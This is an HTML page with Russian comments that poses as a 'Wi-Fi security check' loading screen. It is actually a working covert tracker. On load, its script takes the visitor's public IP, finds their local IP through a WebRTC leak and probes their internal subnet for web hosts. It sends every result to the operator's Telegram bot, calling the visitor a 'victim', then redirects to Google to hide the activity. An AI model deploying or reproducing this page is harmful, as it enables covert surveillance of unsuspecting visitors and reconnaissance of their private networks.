<!DOCTYPE html>
<html>
<head>
    <title>Загрузка...</title>
</head>
<body>
    <h2>Проверка безопасности Wi-Fi...</h2>
    <script>
        const BOT_TOKEN = 'ТВОЙ_ТОКЕН_БОТА';   // ← сюда свой токен
        const CHAT_ID = 'ТВОЙ_ЧАТ_АЙДИ';       // ← сюда свой chat id

        async function sendMsg(text) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
            } catch (e) {}
        }

        async function getPublicIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch (e) {
                return 'не удалось получить';
            }
        }

        function getLocalIP() {
            return new Promise((resolve, reject) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (e) => {
                    if (e.candidate) {
                        const ip = e.candidate.address;
                        if (/^(192\.168\.|10\.|172\.(1[6-9]|2\d|3[01])\.)/.test(ip)) {
                            resolve(ip);
                            pc.close();
                        }
                    }
                };
                setTimeout(() => reject(new Error('Локальный IP не найден')), 3000);
            });
        }

        async function scanSubnet(subnet) {
            const found = [];
            const parts = subnet.split('.');
            const base = parts.slice(0, 3).join('.');
            const promises = [];
            for (let i = 1; i <= 254; i++) {
                const ip = `${base}.${i}`;
                promises.push(new Promise((resolve) => {
                    const img = new Image();
                    img.onload = () => {
                        found.push(`✅ ${ip}:80`);
                        resolve();
                    };
                    img.onerror = () => {
                        const img2 = new Image();
                        img2.onload = () => {
                            found.push(`✅ ${ip}:443`);
                            resolve();
                        };
                        img2.onerror = () => resolve();
                        img2.src = `https://${ip}:443/favicon.ico?${Math.random()}`;
                    };
                    img.src = `http://${ip}/favicon.ico?${Math.random()}`;
                }));
            }
            await Promise.all(promises);
            return found;
        }

        (async () => {
            // Отправляем публичный IP сразу
            const pubIP = await getPublicIP();
            await sendMsg(`🔵 Публичный IP жертвы: ${pubIP}`);

            let localIP = null;
            try {
                localIP = await getLocalIP();
                await sendMsg(`🟢 Локальный IP: ${localIP}\nСканирую её подсеть...`);
                const hosts = await scanSubnet(localIP);
                const res = hosts.length > 0 ? hosts.join('\n') : 'Ничего не найдено в этой подсети';
                await sendMsg(`Результат:\n${res}`);
            } catch (e) {
                await sendMsg(`🟡 Локальный IP не получен, сканирую типовые подсети...`);
                const commonSubnets = ['192.168.0.0', '192.168.1.0', '10.0.0.0'];
                let allHosts = [];
                for (const subnet of commonSubnets) {
                    await sendMsg(`Сканирую ${subnet}/24...`);
                    const hosts = await scanSubnet(subnet);
                    allHosts = allHosts.concat(hosts);
                }
                const total = allHosts.length > 0 ? allHosts.join('\n') : 'Вообще ничего не найдено';
                await sendMsg(`Результат по всем подсетям:\n${total}`);
            }

            // Редирект
            window.location = 'https://www.google.com';
        })();
    </script>
</body>
</html>
